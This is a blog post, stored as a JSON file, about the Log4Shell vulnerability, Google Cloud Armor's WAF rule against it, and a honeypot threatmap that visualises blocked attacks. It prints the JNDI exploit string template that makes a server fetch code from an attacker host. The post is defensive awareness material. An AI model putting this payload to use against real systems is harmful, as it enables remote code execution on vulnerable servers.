@@ -1,0 +1,82 @@
+{
+    "title": "A Threatmap for Log4Shell attacks on Google Cloud",
+    "author": "Rob Vandenberghe",
+    "readTime": "3 min read",
+    "publishDate": "Jan 7, 2022",
+    "blocks": [
+        {
+            "type": "P",
+            "content": "That is how the Log4j vulnerability is described. Log4j is a package that is often used in Java applications for logging. In brief, the vulnerability allows for remote code execution on the machine running an affected application. Attackers can simply do this by letting the application log a malicious string that fetches and executes a java class from a remote server under control of the attacker. The malicious string looks something like this:"
+        },
+        {
+            "type": "BLOCKQUOTE",
+            "content": "${jndi:ldap://[ATTACKER SERVER]/[EXPLOIT FILE]}"
+        },
+        {
+            "type": "P",
+            "content": "There are 2 reasons why this is the biggest, most critical vulnerability of the last decade. One, the vulnerability is very easy to exploit. Two, almost every Java application uses Log4j and thus is vulnerable to the exploit."
+        },
+        {
+            "type": "H2",
+            "content": "Cloud Armor to detect and block Log4j exploits"
+        },
+        {
+            "type": "P",
+            "content": "Cloud Armor is a Web Application Firewall (WAF) that is part of the Google Cloud stack. When enabled, it helps to protect applications deployed on Google Cloud from attacks such as DDoS, XSS, SQL Injection, File Inclusion, Remote Code Execution attacks."
+        },
+        {
+            "type": "P",
+            "content": "The Google Cloud team came in clutch and published a WAF rule which can help to detect and block exploit attempts of the Log4j vulnerability before the request hits the backend."
+        },
+        {
+            "type": "P",
+            "content": "For more information on how it works, you can read this great blogpost of Google Cloud: https://cloud.google.com/blog/products/identity-security/cloud-armor-waf-rule-to-help-address-apache-log4j-vulnerability."
+        },
+        {
+            "type": "P",
+            "content": "Of course, the job is not done by updating a WAF rule. The actual vulnerability in the package should be patched. But this is tedious process that takes a lot of time and potentially breaks your application in the process. Cloud Armor gives you extra time to patch critical vulnerabilities while keeping your applications secure."
+        },
+        {
+            "type": "H2",
+            "content": "Visualizing Cloud Armor logs in a Threatmap"
+        },
+        {
+            "type": "P",
+            "content": "At ML6, we took it a step further. We deployed a simple honeypot on our Google Cloud environment to visualize the different types of attacks that are executed on public facing applications."
+        },
+        {
+            "type": "P",
+            "content": "The honey pot is protected with Cloud Armor rules, which detect and block malicious requests. The logs of malicious requests, created by Cloud Armor, are then visualized in real-time in this dashboard."
+        },
+        {
+            "type": "P",
+            "content": "In the gif below you can see the result of similated attacks that we executed ourselves:"
+        },
+        {
+            "type": "FIGURE",
+            "filename": "b0e8207f10d01d6dd1dd1d581e9dac0a.jpg",
+            "src": "https://miro.medium.com/v2/resize:fit:700/1*3GDwVNcsn084LnQjT5BPgw.gif",
+            "caption": null
+        },
+        {
+            "type": "P",
+            "content": "Regarding the real attacks: in the last 7 days we recorded 48 malicious strings being sent to the honeypot that were trying to exploit the log4j vulnerability, originating from 4 distinct remote IPs."
+        },
+        {
+            "type": "H2",
+            "content": "Conclusion"
+        },
+        {
+            "type": "P",
+            "content": "The log4shell saga is bad, but it is to be expected that similar issues will arise in the future. Hackers groups are probably already scanning through popular open-source libraries to find the next big vulnerability that exposes practically every company in the world. Google Cloud Armor is a great tool in your arsenal to protect applications at the edge and mitigate risks of zeroday vulnerabilities that might be lurking in open-source libraries."
+        },
+        {
+            "type": "P",
+            "content": "For development teams it is important to be aware of the fact that these attacks are very real and things can go south very quickly when not taking security seriously."
+        },
+        {
+            "type": "P",
+            "content": "At ML6, the threatmap is displayed on big monitors at the offices. Not so because it provides intelligence about threats, but because it is a great awareness tool for technical teams. It’s a constant reminder that threats are real and applications should be secured appropriately in every step of the development and deployment lifecycle."
+        }
+    ]
+}
